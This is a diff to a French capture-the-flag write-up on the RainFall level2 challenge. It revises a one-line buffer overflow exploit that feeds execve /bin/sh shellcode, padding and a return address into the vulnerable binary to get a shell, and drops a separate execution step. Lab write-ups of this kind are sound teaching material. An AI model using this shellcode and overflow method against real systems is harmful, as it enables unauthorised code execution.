@@ -160,14 +160,9 @@ Le buffer d'attaque final sera structuré comme suit :
 - Adresse de retour : 4 octets
 
 ```bash
-level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 50 + "\x08\xa0\x04\x08"' > /tmp/exploit
+level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat -) | ./level2
 ```
 
-### Exécution de l'exploit
-
-```bash
-level2@RainFall:~$ cat /tmp/exploit - | ./level2
-```
 
 ## Accès au Shell
 
